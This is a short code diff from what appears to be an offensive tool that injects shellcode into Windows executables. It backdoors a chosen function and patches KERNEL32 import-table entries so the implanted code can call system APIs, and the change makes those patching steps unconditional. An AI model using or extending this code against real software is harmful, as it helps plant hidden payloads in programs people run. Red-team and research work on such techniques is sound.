@@ -21,7 +21,6 @@ def inject_exe(main_shc: bytes, settings: Settings, carrier: Carrier):
     exe_in = settings.inject_exe_in
     exe_out = settings.inject_exe_out
     carrier_invoke_style: CarrierInvokeStyle = settings.carrier_invoke_style
-    source_style: FunctionInvokeStyle = settings.source_style
 
     logger.info("--[ Injecting: into {} -> {}".format(exe_in, exe_out))
 
@@ -38,25 +37,24 @@ def inject_exe(main_shc: bytes, settings: Settings, carrier: Carrier):
     function_backdoorer = FunctionBackdoorer(superpe)
 
     # Patch IAT (if necessary and wanted)
-    if source_style == FunctionInvokeStyle.iat_reuse:
-        for iatRequest in carrier.get_all_iat_requests():
-            # skip available
-            addr = superpe.get_vaddr_of_iatentry(iatRequest.name)
-            if addr != None:
-                logger.info("    IAT {} is at: 0x{:X}".format(iatRequest.name, addr))
-                continue
-            iat_name = superpe.get_replacement_iat_for("KERNEL32.dll", iatRequest.name)
+    for iatRequest in carrier.get_all_iat_requests():
+        # skip available
+        addr = superpe.get_vaddr_of_iatentry(iatRequest.name)
+        if addr != None:
+            logger.info("    IAT {} is at: 0x{:X}".format(iatRequest.name, addr))
+            continue
+        iat_name = superpe.get_replacement_iat_for("KERNEL32.dll", iatRequest.name)
 
-            if not settings.fix_missing_iat:
-                raise Exception("Error: {} not available, but fix_missing_iat is False".format(
-                    iatRequest.name
-                ))
-            # do the patch
-            superpe.patch_iat_entry("KERNEL32.dll", iat_name, iatRequest.name)
+        if not settings.fix_missing_iat:
+            raise Exception("Error: {} not available, but fix_missing_iat is False".format(
+                iatRequest.name
+            ))
+        # do the patch
+        superpe.patch_iat_entry("KERNEL32.dll", iat_name, iatRequest.name)
 
-        # we modify the IAT raw, so reparsing is required
-        superpe.pe.parse_data_directories()
-        superpe.init_iat_entries()
+    # we modify the IAT raw, so reparsing is required
+    superpe.pe.parse_data_directories()
+    superpe.init_iat_entries()
 
     shellcode_offset: int = 0  # file offset
 
@@ -121,9 +119,8 @@ def inject_exe(main_shc: bytes, settings: Settings, carrier: Carrier):
                     addr))
                 function_backdoorer.backdoor_function(addr, shellcode_rva, shellcode_len)
 
-    if source_style == FunctionInvokeStyle.iat_reuse:
-        logger.info("--( Fix shellcode to re-use IAT entries")
-        injected_fix_iat(superpe, carrier)
+    logger.info("--( Fix shellcode to re-use IAT entries")
+    injected_fix_iat(superpe, carrier)
     logger.info("--( Fix shellcode to reference data stored in .rdata")
     injected_fix_data(superpe, carrier)
 
